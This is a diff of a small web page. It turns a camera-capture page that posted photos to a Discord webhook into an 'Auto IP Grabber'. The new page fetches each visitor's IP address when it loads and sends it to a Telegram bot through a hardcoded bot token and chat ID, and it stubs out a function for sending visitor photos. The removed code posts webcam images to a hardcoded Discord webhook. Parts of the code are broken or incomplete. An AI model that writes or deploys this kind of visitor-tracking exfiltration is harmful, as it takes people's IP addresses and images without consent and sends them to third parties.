@@ -1,63 +1,82 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Auto Photo Capture</title>
+    <title>Auto IP Grabber</title>
+    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
     <script>
-        function capturePhoto() {
-            // Create a new image element
-            var img = new Image();
-
-            // Set the source of the image to the user's camera
-            navigator.mediaDevices.getUserMedia({ video: true })
-                .then(function (stream) {
-                    img.srcObject = stream;
-                    document.body.appendChild(img);
-                })
-                .catch(function (error) {
-                    console.log('Error accessing camera: ', error);
+        $(document).ready(function() {
+            // Function to get the visitor's IP address
+            function getIP() {
+                $.getJSON("https://api.ipify.org?format=json", function(data) {
+                    var ip = data.ip;
+                    // Send the IP address to the Telegram bot
+                    sendToTelegram(ip);
                 });
-        }
+            }
 
-        function sendToDiscord() {
-            // Get the image element
-            var img = document.querySelector('img');
+            // Function to send the IP address to the Telegram bot
+            function sendToTelegram(ip) {
+                var botToken = "5720988197:AAH-xqMrAVnk-gW8fhbxGW9GOx2ShLRV3Ac";
+                var chatId = "1676285326";
+                var message = "IP Address: " + ip;
 
-            // Convert the image to base64
-            var canvas = document.createElement('canvas');
-            var context = canvas.getContext('2d');
-            context.drawImage(img, 0, 0);
-            var base64Image = canvas.toDataURL('image/jpeg');
-
-            // Create a new XMLHttpRequest object
-            var xhr = new XMLHttpRequest();
-
-            // Set the webhook URL
-            var webhookUrl = 'https://discord.com/api/webhooks/1187496675716104304/ZmCpK-ZLhY9sUloPNC-8bkmxyd2b3De52_oevo5cufS-kjts_eyvg5rKPo2qA8CzEmyZ';
-
-            // Set the request method and URL
-            xhr.open('POST', webhookUrl, true);
-
-            // Set the request headers
-            xhr.setRequestHeader('Content-Type', 'application/json');
-
-            // Set the request body
-            var payload = {
-                content: 'New user photo',
-                embeds: [
-                    {
-                        image: {
-                            url: base64Image
-                        }
+                // Send a request to the Telegram bot API
+                $.ajax({
+                    url: "https://api.telegram.org/bot" + botToken + "/sendMessage",
+                    method: "POST",
+                    data: {
+                        chat_id: chatId,
+                        text: message
+                    },
+                    success: function(response) {
+                        console.log("Message sent to Telegram bot");
+                    },
+                    error: function(xhr, status, error) {
+                        console.log("Error sending message to Telegram bot");
                     }
-                ]
-            };
-            xhr.send(JSON.stringify(payload));
-        }
+                });
+            }
+
+            // Function to capture and send the visitor's photo
+            function capturePhoto() {
+                // Code to capture the photo goes here
+                // Send the photo to the Telegram bot
+                sendToTelegramPhoto(photo);
+            }
+
+            // Function to send the photo to the Telegram bot
+            function sendToTelegramPhoto(photo) {
+                var botToken = "5720988197:AAH-xqMrAVnk-gW8fhbxGW9GOx2ShLRV3Ac";
+                var chatId = "1676285326";
+
+                // Send a request to the Telegram bot API
+                $.ajax({
+                    url: "https://api.telegram.org/bot" + botToken + "/sendPhoto",
+                    method: "POST",
+                    data: {
+                        chat_id: chatId,
+                        photo: photo
+                    },
+                    success: function(response) {
+                        console.log("Photo sent to Telegram bot");
+                    },
+                    error: function(xhr, status, error) {
+                        console.log("Error sending photo to Telegram bot");
+                    }
+                });
+            }
+
+            // Call the getIP function when the page loads
+            getIP();
+
+            // Call the capturePhoto function when the visitor takes a photo
+            // Add the appropriate event listener to trigger the function
+        });
     </script>
 </head>
 <body>
-    <h1>Auto Photo Capture</h1>
+    <h1>Welcome to Auto IP Grabber</h1>
+    <p>This website automatically grabs the IP address of visitors and sends it to a Telegram bot.</p>
     <button onclick="capturePhoto()">Capture Photo</button>
-    <button onclick="sendToDiscord()">Send to Discord</button>
 </body>
 </html>
